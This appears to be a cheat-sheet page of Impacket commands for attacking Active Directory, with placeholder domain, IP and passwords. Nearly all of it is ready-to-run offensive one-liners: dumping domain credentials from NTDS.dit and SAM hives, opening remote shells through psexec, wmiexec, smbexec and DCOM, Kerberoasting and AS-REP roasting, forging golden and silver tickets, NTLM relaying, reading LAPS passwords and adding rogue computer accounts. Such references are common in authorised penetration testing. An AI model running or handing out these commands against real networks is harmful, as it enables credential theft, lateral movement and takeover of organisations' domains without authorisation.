Examples

Dump all domain credentials from NTDS.dit

impacket-secretsdump -just-dc-ntlm evilcorp.local/administrator:Pass123@10.10.10.1

Dump NTDS.dit with NTLM hash authentication

impacket-secretsdump -ntds ntds.dit -system SYSTEM.hive LOCAL

Remote SAM hive dump

impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL

Psexec interactive shell

impacket-psexec evilcorp.local/administrator:Pass123@10.10.10.1

WMI exec (less noisy than psexec)

impacket-wmiexec evilcorp.local/administrator:Pass123@10.10.10.1

SMB exec via Windows SMB shares

impacket-smbexec evilcorp.local/administrator:Pass123@10.10.10.1

Schedule task execution via at.exe / schtasks

impacket-atexec evilcorp.local/administrator:Pass123@10.10.10.1 whoami

AS-REP roasting — find users without pre-authentication

impacket-GetNPUsers -dc-ip 10.10.10.1 -request evilcorp.local/user

Kerberoasting — request TGS for service accounts

impacket-GetUserSPNs -dc-ip 10.10.10.1 -request evilcorp.local/user:Pass123

Get TGT for a user

impacket-getTGT evilcorp.local/user:Pass123 -dc-ip 10.10.10.1

Get service ticket (ST) for impersonation

impacket-getST -dc-ip 10.10.10.1 -spn cifs/target.evilcorp.local evilcorp.local/user:Pass123

Golden ticket — forge KRBTGT ticket

impacket-ticketer -nthashes <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain evilcorp.local administrator

Silver ticket — forge service ticket

impacket-ticketer -nthashes <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain evilcorp.local -spn cifs/target.evilcorp.local administrator

NTLM relay with ntlmrelayx (capture + relay)

impacket-ntlmrelayx -tf targets.txt -smb2support -socks

NTLM relay to LDAP for RBCD

impacket-ntlmrelayx -t ldap://10.10.10.1 -smb2support --delegate-access

Enumerate users via SAMR protocol

impacket-samrdump -samr 10.10.10.1

Enumerate users via LookupSID

impacket-lookupsid evilcorp.local/administrator:Pass123@10.10.10.1

RPC endpoint mapper dump

impacket-rpcdump 10.10.10.1

SMB client interactive shell

impacket-smbclient evilcorp.local/administrator:Pass123@10.10.10.1

DCOM execution via MMC20.Application

impacket-dcomexec evilcorp.local/administrator:Pass123@10.10.10.1

LAPS password reader

impacket-GetLAPSPasswords -dc-ip 10.10.10.1 evilcorp.local/user:Pass123

Add computer to domain (ESC1 machine account)

impacket-addcomputer -computer-name 'FAKECOMP$' -computer-pass 'FakePass123' -dc-ip 10.10.10.1 evilcorp.local/user:Pass123

Impacket — AD Exploitation Suite

Impacket is a collection of Python classes for working with network protocols and a suite of executable scripts covering nearly every aspect of Active Directory assessment.
